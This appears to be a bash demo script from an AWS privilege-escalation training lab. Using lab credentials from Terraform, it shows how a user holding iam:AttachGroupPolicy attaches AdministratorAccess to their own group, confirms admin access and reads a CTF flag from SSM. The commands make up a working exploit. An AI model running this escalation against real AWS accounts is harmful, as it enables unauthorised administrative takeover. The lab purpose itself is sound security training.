#!/bin/bash

# Demo script for iam:AttachGroupPolicy privilege escalation
# This script demonstrates how a user with AttachGroupPolicy permission can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-010-to-admin-starting-user"
GROUP_NAME="pl-prod-iam-010-to-admin-group"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AttachGroupPolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(OTEL_TRACES_EXPORTER= terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_010_iam_attachgrouppolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and group name
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
GROUP_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.group_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Check current permissions (should be limited)
echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
use_starting_creds
echo "Attempting to list S3 buckets (should fail)..."
show_cmd "Attacker" "aws s3 ls"
if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
else
    echo -e "${YELLOW}Warning: Unexpected permissions${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Verify group membership
echo -e "${YELLOW}Step 5: Verifying group membership${NC}"
use_starting_creds
show_cmd "Attacker" "aws iam list-groups-for-user --user-name $STARTING_USER --query 'Groups[*].GroupName' --output text"
USER_GROUPS=$(aws iam list-groups-for-user --user-name $STARTING_USER --query 'Groups[*].GroupName' --output text)
echo "User is member of groups: $USER_GROUPS"

if [[ $USER_GROUPS == *"$GROUP_NAME"* ]]; then
    echo -e "${GREEN}✓ Confirmed membership in $GROUP_NAME${NC}\n"
else
    echo -e "${RED}Error: User is not a member of $GROUP_NAME${NC}"
    exit 1
fi

# [EXPLOIT] Step 6: Attach AdministratorAccess policy to the group
echo -e "${YELLOW}Step 6: Attaching AdministratorAccess policy to group${NC}"
use_starting_creds
echo "This is the privilege escalation vector..."

ADMIN_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"

show_attack_cmd "Attacker" "aws iam attach-group-policy --group-name $GROUP_NAME --policy-arn $ADMIN_POLICY_ARN"
aws iam attach-group-policy \
    --group-name $GROUP_NAME \
    --policy-arn $ADMIN_POLICY_ARN

echo "Attached policy: $ADMIN_POLICY_ARN to group: $GROUP_NAME"
echo -e "${GREEN}✓ Successfully attached admin policy to group${NC}\n"

# Sleep to allow policy propagation
echo -e "${GREEN}✓ Sleeping for 15 seconds to let the policy propagate${NC}\n"
sleep 15

# [OBSERVATION] Step 7: Verify admin access
echo -e "${YELLOW}Step 7: Verifying administrator access${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

# Test admin permissions
echo "Testing admin permissions (listing IAM users)..."
show_cmd "ReadOnly" "aws iam list-users --query 'Users[*].UserName' --output text"
IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head -5)
echo "Successfully listed IAM users: $IAM_USERS"
echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# [EXPLOIT] Step 8: Capture the CTF flag
echo -e "${YELLOW}Step 8: Capturing the CTF flag${NC}"
use_starting_creds
show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/iam-010-to-admin --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name /pathfinding-labs/flags/iam-010-to-admin --query 'Parameter.Value' --output text)

if [ -z "$FLAG_VALUE" ]; then
    echo -e "${RED}Error: Could not retrieve CTF flag — ensure privilege escalation completed successfully${NC}"
    exit 1
fi

echo -e "${GREEN}Flag: $FLAG_VALUE${NC}\n"

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: User is member of group ${YELLOW}$GROUP_NAME${NC}"
echo -e "Step 2: Attached ${YELLOW}AdministratorAccess${NC} to the group"
echo -e "Step 3: Gained ${GREEN}Administrator Access${NC} via group membership"
echo -e "Step 4: Captured CTF flag: ${GREEN}$FLAG_VALUE${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (iam:AttachGroupPolicy) → $GROUP_NAME → AdministratorAccess → Admin → (ssm:GetParameter) → CTF Flag"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the admin policy${NC}"
echo ""

# Cleanup instructions
echo -e "${YELLOW}To clean up:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
